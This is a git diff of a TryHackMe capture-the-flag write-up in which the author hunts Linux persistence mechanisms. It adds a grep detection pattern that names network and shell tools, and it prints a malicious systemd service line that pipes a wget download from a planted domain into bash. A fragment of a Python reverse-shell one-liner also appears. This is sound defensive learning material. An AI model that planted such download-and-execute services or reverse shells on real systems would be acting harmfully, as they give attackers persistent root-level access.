@@ -3,7 +3,7 @@
   <img src="https://github.com/user-attachments/assets/3efe3842-4146-4b91-8c21-0ef6da84f374" width="90" height="90" />
 </div>
 <br>
-<p align="center"> <b>Difficulty</b>: ?/10 (???) <b>Completed</b>: ✔️ </p>
+<p align="center"> <b>Difficulty</b>: 3/10 (Fairly Easy) <b>Completed</b>: ✔️ 03.02.2026 </p>
 
 As I'm working with a SOC team right now, I think it might help to get some basic blue teaming knowledge into my head. This challenge focuses on conducting a live system analysis to uncover post-compromise activity related to persistence mechanisms.
 
@@ -139,9 +139,36 @@ When decoding the base64 encoding, we get the third part of our message.
 <img width="628" height="529" alt="image" src="https://github.com/user-attachments/assets/652e3c9e-edbd-4d60-9640-610d8bb2abb8" />
 
 ## I run with the big dogs, booting up alongside the system.
-This could very well refer to system/root-level processes and start during system boot. It survives reboots and runs before any user logs in. So we're talking about init / service mechanisms. Most Linux distros use systemd for that, so the primary directory to check out is */etc/systemd/system/*
+This could very well refer to system/root-level processes and start during system boot. It survives reboots and runs before any user logs in. So we're talking about init / service mechanisms. Most Linux distros use systemd for that, so the primary directory to check out is */etc/systemd/system/*. After listing all the services I realized that this would take way longer than it should. It was time to change the strategy, so I decided to filter. As we are hunting persistence + remote access, searching for bad primitives might be the way to go. I ran the following command
 
+```
+ubuntu@tryhackme:~$ sudo grep -R --line-number -E 'ExecStart=.*(bash|sh|nc|netcat|curl|wget|python|perl|base64|socat)' /etc/systemd/system 2>/dev/null
+```
 
+With this we are asking our system to show us every systemd service that starts a shell, networking tool, or scripting language when the system boots. Inside every .service file we have a command that is defined by *ExecStart=*. Systemd starts those services at boot. They are loved by hackers, because if they can control that line, they can run code as root, run it on every boot and even before the users log in, blending in with normal services. To catch the patterns we use a combination of grep, recursive (-R), --line-number which shows where the match is and extended regex (-E), which allows grouping and OR.
+
+```
+ubuntu@tryhackme:~$ sudo grep -R --line-number -E 'ExecStart=.*(bash|sh|nc|netcat|curl|wget|python|perl|base64|socat)' /etc/systemd/system 2>/dev/null
+/etc/systemd/system/final.target.wants/snapd.system-shutdown.service:17:ExecStart=/bin/cp /usr/lib/snapd/system-shutdown /run/initramfs/shutdown
+/etc/systemd/system/sysinit.target.wants/systemd-timesyncd.service:29:ExecStart=!!/usr/lib/systemd/systemd-timesyncd
+/etc/systemd/system/sysinit.target.wants/open-iscsi.service:24:ExecStart=/usr/lib/open-iscsi/activate-storage.sh
+/etc/systemd/system/sysinit.target.wants/keyboard-setup.service:10:ExecStart=/lib/console-setup/keyboard-setup.sh
+/etc/systemd/system/network-online.target.wants/networking.service:18:ExecStart=-/bin/sh -c 'if [ -f /run/network/restart-hotplug ]; then /sbin/ifup -a --read-environment --allow=hotplug; fi'
+/etc/systemd/system/multi-user.target.wants/console-setup.service:11:ExecStart=/lib/console-setup/console-setup.sh
+/etc/systemd/system/multi-user.target.wants/cipher.service:5:ExecStart=/bin/bash -c 'wget NHRoIHBhcnQgLSBoMW5nXyAK.s1mpl3bd.com --output - | bash 2>/dev/null'
+/etc/systemd/system/multi-user.target.wants/snapd.core-fixup.service:11:ExecStart=/usr/lib/snapd/snapd.core-fixup.sh
+```
+
+One of those lines stands out immediately.
+
+```
+/etc/systemd/system/multi-user.target.wants/cipher.service:5:
+ExecStart=/bin/bash -c 'wget NHRoIHBhcnQgLSBoMW5nXyAK.s1mpl3bd.com --output - | bash 2>/dev/null'
+```
+
+This is most definetely a malicious line, from the service name to the ExecStart command that contains the classic attack pattern. With wget a payload gets downloaded, which gets send to stdout and is executed immediately with bash. Last thing to do is decode the base64 encoding that is contained in the string.
+
+<img width="287" height="497" alt="image" src="https://github.com/user-attachments/assets/9ff384d4-4f3f-4ba9-a530-4d4c182855d0" />
 
 ## I love welcome messages.
 In Linux this could be a hint for login banners. When logging into a Linux system (locally or via SSH), we can sometimes see text like
@@ -222,3 +249,12 @@ python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.S
 This provides stealthy, reliable persistence. We take the last hex encoded string from the malicious code and decode to get the final part of our message.
 
 <img width="1409" height="422" alt="image" src="https://github.com/user-attachments/assets/ef658d39-51e1-44aa-a2de-620d4e9b2879" />
+
+## Lesson Learned
+I got acquainted with different persistance mechanisms that teached me what kind of different attacking schemes a hacker could make use of, if he wanted to hide his presence on a compromised system. The relevant techniques mentioned in this challenge were
+- cron - which runs every minute
+- .bashrc - which runs on interactive shell
+- MOTD - which runs on login and
+- systemd service - which runs at boot.
+
+I liked this challenge as it gave a very realistic outlook on how an attacker would think when trying to compromise a machine, minus the hints at the end. I wasn't familiar with ANY of these techniques, so the learning effect was huge. I'll take away a lot of this and hopefully apply it to some other challenge soon.
